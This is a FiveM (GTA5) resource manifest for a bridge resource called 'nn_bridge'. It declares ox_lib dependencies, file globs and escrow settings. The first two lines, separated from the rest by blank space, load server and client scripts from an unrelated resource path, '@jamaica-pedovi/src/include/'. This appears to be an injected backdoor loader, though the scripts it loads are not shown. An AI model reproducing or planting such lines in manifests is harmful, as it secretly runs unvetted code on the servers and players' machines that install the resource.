server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'cerulean'
game 'gta5'
lua54 'yes'

name 'nn_bridge'
author 'sinaps'
version '1.0.1'

files {
    '**/*.lua',
    '**/**/*.lua',
    '*.lua',
}

shared_scripts {
    '@ox_lib/init.lua',
    'init.lua',
}

ox_libs {
    'interface',
}

escrow_ignore {
    '**/*.lua',
    '**/**/*.lua',
    '*.lua',
}
dependency '/assetpacks'